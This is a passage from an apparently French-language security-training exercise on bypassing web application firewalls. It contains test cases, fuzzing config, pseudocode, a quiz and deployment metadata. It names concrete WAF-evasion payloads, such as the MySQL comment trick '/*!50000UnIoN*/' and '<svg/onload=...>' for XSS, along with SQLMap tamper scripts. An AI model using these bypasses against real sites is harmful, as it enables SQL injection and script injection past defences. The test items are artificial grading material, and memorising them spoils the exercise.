      {"name": "cloudflare_xss", "args": ["{\"waf_type\":\"Cloudflare\",\"blocked_patterns\":[\"<script>\",\"onerror\"],\"vulnerability_type\":\"XSS\",\"endpoint\":\"/comment\",\"test_responses\":{\"blocked\":{\"status\":403,\"body\":\"Blocked\"},\"allowed\":{\"status\":200,\"body\":\"OK\"}}}"], "expected_contains": ["svg", "img"], "is_trap": false},
      {"name": "null_input", "args": ["null"], "expected_contains": ["error"], "is_trap": true, "trap_explanation": "NULL must return error"},
      {"name": "empty_patterns", "args": ["{\"waf_type\":\"Custom\",\"blocked_patterns\":[],\"vulnerability_type\":\"SQL_INJECTION\",\"endpoint\":\"/api\",\"test_responses\":{}}"], "expected_contains": ["bypass_payloads"], "is_trap": false}
    ],

    "fuzzing": {
      "enabled": true,
      "iterations": 300,
      "generators": [
        {"type": "enum", "param_index": 0, "field": "waf_type", "values": ["ModSecurity_CRS", "Cloudflare", "AWS_WAF", "Akamai", "Custom"]},
        {"type": "enum", "param_index": 0, "field": "vulnerability_type", "values": ["SQL_INJECTION", "XSS", "LFI", "RCE"]}
      ]
    }
  },

  "norm": {
    "allowed_functions": ["serde_json", "regex", "percent_encoding"],
    "forbidden_functions": ["reqwest", "hyper", "unsafe"],
    "check_security": true,
    "check_memory": true
  }
}
```

---

## ğŸ§  SECTION 5 : COMPRENDRE

### 5.1 Ce que cet exercice enseigne

| Concept | Description |
|---------|-------------|
| **WAF Architecture** | Comment fonctionnent ModSecurity, Cloudflare, AWS WAF |
| **Pattern Matching** | Regex vs exact match, scoring systems |
| **Bypass Techniques** | Case mixing, comments, encoding, HPP |
| **SQLMap Tampers** | Scripts de transformation automatique |

### 5.2 LDA

```
FONCTION advanced_waf_bypass QUI RETOURNE UNE CHAÃNE
DÃ‰BUT FONCTION
    VALIDER l'entrÃ©e (non null, JSON valide)
    ANALYSER le WAF (identifier rÃ¨gles et gaps)
    GÃ‰NÃ‰RER les payloads de bypass selon vulnerability_type
    CALCULER le score de confiance
    CONSTRUIRE la commande SQLMap
    RETOURNER le rÃ©sultat JSON
FIN FONCTION
```

### 5.3 Visualisation ASCII

```
              REQUÃŠTE MALVEILLANTE
                     â”‚
                     â–¼
â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
â”‚                  WAF                    â”‚
â”‚  â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”    â”‚
â”‚  â”‚  Rule 942100: UNION.*SELECT     â”‚â”€â”€â”€â–¶ BLOCK 403
â”‚  â”‚  Rule 941100: <script>          â”‚    â”‚
â”‚  â”‚  Rule 930100: \.\./             â”‚    â”‚
â”‚  â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜    â”‚
â”‚                  â”‚                      â”‚
â”‚              GAP HERE                   â”‚
â”‚         /*!50000UNION*/                 â”‚
â”‚              PASS â–¼                     â”‚
â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜
                     â”‚
                     â–¼
           APPLICATION VULNÃ‰RABLE
```

### 5.8 MnÃ©motechniques

#### ğŸ¬ MEME : "Ocean's Eleven - The Vault"

*"The house always wins. Unless you can change the game."*

Le WAF est le systÃ¨me de sÃ©curitÃ© du casino. Il surveille toutes les entrÃ©es (requÃªtes). Mais comme Ocean's team trouve des angles morts (conduits d'aÃ©ration, fausses identitÃ©s), tu trouves des gaps dans les rÃ¨gles du WAF.

```
Normal request: "' UNION SELECT" â†’ ğŸš¨ BLOCKED
Bypass request: "' /*!50000UnIoN*/" â†’ âœ… ALLOWED
```

---

## ğŸ“ SECTION 7 : QCM

### Question 1
**Quelle technique utilise les commentaires MySQL pour bypasser?**
- A) Case mixing
- B) `/*!50000UNION*/`
- C) Double encoding
- D) HPP

**RÃ©ponse : B**

### Question 2
**Quel tamper script SQLMap alterne majuscules/minuscules?**
- A) space2comment
- B) randomcase
- C) chardoubleencode
- D) between

**RÃ©ponse : B**

### Question 3
**Comment bypasser `<script>` bloquÃ© pour XSS?**
- A) `<SCRIPT>` uniquement
- B) `<svg/onload=...>`
- C) Supprimer le tag
- D) Utiliser HTTPS

**RÃ©ponse : B**

---

## ğŸ“Š SECTION 8 : RÃ‰CAPITULATIF

| CompÃ©tence | Niveau |
|------------|--------|
| Identification gaps WAF | â˜…â˜…â˜…â˜…â˜… |
| Techniques de bypass | â˜…â˜…â˜…â˜…â˜… |
| SQLMap configuration | â˜…â˜…â˜…â˜…â˜† |
| Multi-vuln support | â˜…â˜…â˜…â˜…â˜† |

---

## ğŸ“¦ SECTION 9 : DEPLOYMENT PACK

```json
{
  "deploy": {
    "hackbrain_version": "5.5.2",
    "engine_version": "v22.1",
    "exercise_slug": "3.3.3-g-advanced-waf-bypass",
    "metadata": {
      "exercise_id": "3.3.3-g",
      "exercise_name": "advanced_waf_bypass",
      "difficulty": 9,
      "difficulty_stars": "â˜…â˜…â˜…â˜…â˜…â˜…â˜…â˜…â˜…â˜†",
      "language": "rust",
      "duration_minutes": 300,
      "xp_base": 450,
      "meme_reference": "Ocean's Eleven"
    },
    "cwe_mapping": {
      "primary": "CWE-693",
      "secondary": ["CWE-89", "CWE-79"]
    }
  }
}
```

---

*HACKBRAIN v5.5.2 â€” Advanced WAF Bypass Challenge*
*"The house always wins... unless you know the gaps"*